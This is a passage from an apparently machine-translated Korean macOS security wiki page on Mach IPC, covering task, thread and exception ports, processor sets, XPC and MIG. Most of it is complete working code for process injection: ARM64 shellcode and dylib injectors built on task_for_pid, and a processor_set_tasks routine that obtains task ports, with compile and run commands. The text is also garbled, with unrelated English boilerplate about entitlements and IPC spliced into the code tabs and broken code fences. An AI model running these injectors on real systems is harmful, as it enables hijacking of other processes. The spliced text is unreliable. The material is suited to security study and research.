* `pid_for_task(task, &pid)`: 작업에 대한 SEND 권한이 있는 경우 해당 작업이 관련된 PID를 찾습니다.

작업 내에서 작업을 수행하려면 `mach_task_self()`를 호출하여 자체에 대한 `SEND` 권한이 필요했습니다 (`task_self_trap` (28)을 사용함). 이 권한을 통해 작업은 다음과 같은 여러 작업을 수행할 수 있습니다:

* `task_threads`: 작업의 스레드의 모든 작업 포트에 대한 SEND 권한 가져오기
* `task_info`: 작업에 대한 정보 가져오기
* `task_suspend/resume`: 작업 일시 중지 또는 재개
* `task_[get/set]_special_port`
* `thread_create`: 스레드 생성
* `task_[get/set]_state`: 작업 상태 제어
* 그리고 더 많은 것은 [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)에서 찾을 수 있습니다.

{% hint style="danger" %}
**다른 작업**의 작업 포트에 대한 SEND 권한이 있는 경우 다른 작업에서 이러한 작업을 수행할 수 있습니다.
{% endhint %}

또한, 작업 포트는 **`vm_map`** 포트이기도 하며 `vm_read()` 및 `vm_write()`와 같은 함수를 사용하여 작업 내부의 메모리를 **읽고 조작**할 수 있습니다. 이는 기본적으로 다른 작업의 작업 포트에 대한 SEND 권한이 있는 작업이 해당 작업에 **코드를 삽입**할 수 있음을 의미합니다.

**커널도 작업**이기 때문에 누군가가 **`kernel_task`에 대한 SEND 권한**을 획들하면 커널이 아무 것이나 실행할 수 있게 됩니다 (탈옥).

* **`mach_task_self()`를 호출하여 호출자 작업에 대한 이 포트의 **이름을 가져옵니다. 이 포트는 **`exec()`를 통해만 상속**됩니다. `fork()`로 생성된 새 작업은 새 작업 포트를 받습니다 (`exec()` 이후 suid 이진 파일에서도 새 작업 포트를 받습니다). 작업을 생성하고 해당 포트를 가져오는 유일한 방법은 `fork()`를 수행하는 동안 ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)를 수행하는 것입니다.
* 이 포트에 액세스하는 제한 사항은 이진 파일 `AppleMobileFileIntegrity`의 `macos_task_policy`에서 확인할 수 있습니다:
* 앱이 **`com.apple.security.get-task-allow` 엔터티먼트**를 가지고 있으면 **동일한 사용자의 프로세스가 작업 포트에 액세스**할 수 있습니다 (일반적으로 디버깅을 위해 Xcode에서 추가됨). **인증** 프로세스는 프로덕션 릴리스에서 허용하지 않습니다.
* **`com.apple.system-task-ports`** 엔터티먼트를 가진 앱은 커널을 제외한 **모든** 프로세스의 **작업 포트를 가져올 수** 있습니다. 이전 버전에서는 **`task_for_pid-allow`**로 불렸습니다. 이 권한은 Apple 애플리케이션에만 부여됩니다.
* **루트는** **하드닝된** 런타임으로 컴파일되지 않은 애플리케이션의 작업 포트에 **액세스**할 수 있습니다 (Apple에서 제공되지 않음).

**작업 이름 포트:** _작업 포트_의 권한이 없는 버전입니다. 작업을 참조하지만 제어할 수는 없습니다. 이를 통해 사용 가능한 유일한 것은 `task_info()`인 것 같습니다.

### 스레드 포트

스레드에도 연결된 포트가 있으며 이는 **`task_threads`**를 호출하는 작업 및 `processor_set_threads`에서 볼 수 있습니다. 스레드 포트에 대한 SEND 권한을 얻으면 `thread_act` 하위 시스템의 함수를 사용할 수 있습니다:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

모든 스레드는 **`mach_thread_sef`**를 호출하여 이 포트를 얻을 수 있습니다.

### 작업 포트를 통한 스레드 내 셸코드 삽입

셸코드를 다음에서 가져올 수 있습니다:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 

## entitlements.plist

### Description

The `entitlements.plist` file contains a list of entitlements that are granted to a process. These entitlements define the capabilities and resources that the process is allowed to access on macOS. By modifying the entitlements of a process, an attacker can potentially escalate privileges or abuse inter-process communication (IPC) mechanisms.

### Impact

Manipulating the entitlements of a process can lead to privilege escalation, allowing an attacker to perform unauthorized actions or access restricted resources. This can be used as part of an attack chain to gain further access to the system or to bypass security controls.

### Detection

Monitoring changes to the `entitlements.plist` file and auditing the entitlements granted to processes can help detect unauthorized modifications. Tools like `log` and `audit` can be used to track changes and identify suspicious activity related to entitlement manipulation.

### Mitigation

To mitigate the risk of entitlement abuse, it is important to regularly review and update the entitlements granted to processes. Additionally, restricting the use of sensitive entitlements and implementing least privilege principles can help reduce the impact of potential abuse.

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

이전 프로그램을 **컴파일**하고 동일한 사용자로 코드를 주입할 수 있도록 **엔터티먼트**를 추가하십시오 (그렇지 않으면 **sudo**를 사용해야 합니다).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>  

## macOS Inter-Process Communication (IPC)

### Introduction

Inter-Process Communication (IPC) mechanisms are commonly used in macOS for processes to communicate with each other. Understanding how IPC works can help in identifying potential security vulnerabilities and privilege escalation opportunities. This document provides an overview of macOS IPC mechanisms and potential abuse scenarios.

### Mach Messages

Mach messages are a fundamental IPC mechanism in macOS, allowing processes to send messages to each other. By analyzing and manipulating Mach messages, an attacker may be able to intercept sensitive information or escalate privileges.

### XPC Services

XPC Services are a type of inter-process communication introduced in macOS X Snow Leopard. These services allow different processes to communicate with each other securely. However, misconfigured or vulnerable XPC services can be abused by attackers for privilege escalation or unauthorized access.

### Distributed Objects

Distributed Objects is another IPC mechanism in macOS that allows objects to be used across process boundaries. Understanding how Distributed Objects work can help in identifying potential security issues related to object sharing between processes.

### Conclusion

macOS IPC mechanisms provide powerful capabilities for processes to communicate and share resources. However, improper configuration or vulnerabilities in IPC mechanisms can be exploited by attackers for malicious purposes. It is essential for security professionals to understand macOS IPC mechanisms and potential abuse scenarios to secure macOS systems effectively.
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
iOS에서 작동하려면 쓰기 가능한 메모리를 실행 가능하게 만들기 위해 entitlement `dynamic-codesigning`이 필요합니다.
{% endhint %}

### 태스크 포트를 통한 스레드 내 Dylib 삽입

macOS에서 **스레드**는 **Mach**를 통해 조작되거나 **posix `pthread` api**를 사용하여 조작될 수 있습니다. 이전 삽입에서 생성된 스레드는 Mach api를 사용하여 생성되었기 때문에 **posix 호환성이 없습니다**.

**간단한 쉘코드를 삽입**하여 명령을 실행하는 것이 가능했던 이유는 **posix 호환 api**를 사용할 필요가 없었기 때문이며, Mach만 사용하면 되었습니다. **더 복잡한 삽입**을 위해서는 **스레드**가 **posix 호환**되어야 합니다.

따라서 **스레드를 개선**하기 위해 **`pthread_create_from_mach_thread`**를 호출하여 **유효한 pthread를 생성**해야 합니다. 그런 다음, 이 새로운 pthread는 시스템에서 **dylib를 로드**하기 위해 **dlopen을 호출**할 수 있습니다. 따라서 다른 작업을 수행하기 위해 새로운 쉘코드를 작성하는 대신 사용자 정의 라이브러리를 로드할 수 있습니다.

예를 들어 **다음과 같은 예제 dylibs**를 찾을 수 있습니다 (예: 로그를 생성하고 해당 로그를 수신할 수 있는 것):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```kr
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"원격 스레드 코드의 메모리 권한을 설정할 수 없음: 오류 %s\n", mach_error_string(kr));
return (-4);
}

// 할당된 스택 메모리의 권한 설정
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"원격 스레드 스택의 메모리 권한을 설정할 수 없음: 오류 %s\n", mach_error_string(kr));
return (-4);
}


// 쉘코드를 실행할 스레드 생성
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // 실제 스택
//remoteStack64 -= 8;  // 16의 정렬이 필요함

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("원격 스택 64  0x%llx, 원격 코드는 %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"원격 스레드 생성 불가: 오류 %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "사용법: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: 디스크에 있는 dylib 경로\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib를 찾을 수 없음\n");
}

}
```
</details>  

## macOS Inter-Process Communication (IPC)

### Overview

Inter-Process Communication (IPC) mechanisms on macOS can be abused by attackers to facilitate privilege escalation. This can be achieved by exploiting vulnerabilities in how processes communicate with each other, such as through XPC services, Mach ports, and shared memory. Understanding these mechanisms is crucial for both defenders and attackers in macOS security research and exploitation.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### 태스크 포트를 통한 스레드 해킹 <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

이 기술에서는 프로세스의 스레드가 해킹됩니다:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### 태스크 포트 주입 탐지

`task_for_pid` 또는 `thread_create_*`를 호출할 때 커널의 task 구조체에서 카운터가 증가하며 이는 사용자 모드에서 `task_info(task, TASK_EXTMOD_INFO, ...)`를 호출하여 액세스할 수 있습니다.

## 예외 포트

스레드에서 예외가 발생하면 해당 예외는 스레드의 지정된 예외 포트로 전송됩니다. 스레드가 처리하지 않으면 태스크 예외 포트로 전송됩니다. 태스크가 처리하지 않으면 호스트 포트로 전송되며 이는 launchd에 의해 관리됩니다(여기서 확인됨). 이를 예외 처리라고 합니다.

보통 마지막에는 적절하게 처리되지 않으면 ReportCrash 데몬이 처리합니다. 그러나 동일한 태스크의 다른 스레드가 예외를 처리할 수 있으며 이는 `PLCrashReporter`와 같은 크래시 보고 도구가 하는 일입니다.

## 기타 객체

### 클록

어떤 사용자든 클록에 대한 정보에 액세스할 수 있지만 시간을 설정하거나 다른 설정을 수정하려면 루트여야 합니다.

정보를 얻기 위해 `clock` 서브시스템에서 `clock_get_time`, `clock_get_attributtes`, `clock_alarm`과 같은 함수를 호출할 수 있습니다.\
값을 수정하려면 `clock_priv` 서브시스템을 사용하여 `clock_set_time`, `clock_set_attributes`와 같은 함수를 사용할 수 있습니다.

### 프로세서 및 프로세서 세트

프로세서 API를 사용하면 `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`과 같은 함수를 호출하여 단일 논리 프로세서를 제어할 수 있습니다.

또한 **프로세서 세트** API는 여러 프로세서를 그룹화하는 방법을 제공합니다. **`processor_set_default`**를 호출하여 기본 프로세서 세트를 검색할 수 있습니다.\
프로세서 세트와 상호 작용하는 몇 가지 흥미로운 API는 다음과 같습니다:

* `processor_set_statistics`
* `processor_set_tasks`: 프로세서 세트 내의 모든 작업에 대한 send 권한 배열 반환
* `processor_set_threads`: 프로세서 세트 내의 모든 스레드에 대한 send 권한 배열 반환
* `processor_set_stack_usage`
* `processor_set_info`

[**이 게시물**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)에서 언급된대로, 과거에는 **`processor_set_tasks`**를 호출하여 다른 프로세스에서 작업 포트를 얻어 제어할 수 있었지만 이제는 해당 기능을 사용하려면 루트가 필요하며 이는 보호되어 있어 보호되지 않은 프로세스에서만 이러한 포트를 얻을 수 있습니다.

다음과 같이 시도할 수 있습니다:

<details>

<summary><strong>processor_set_tasks 코드</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
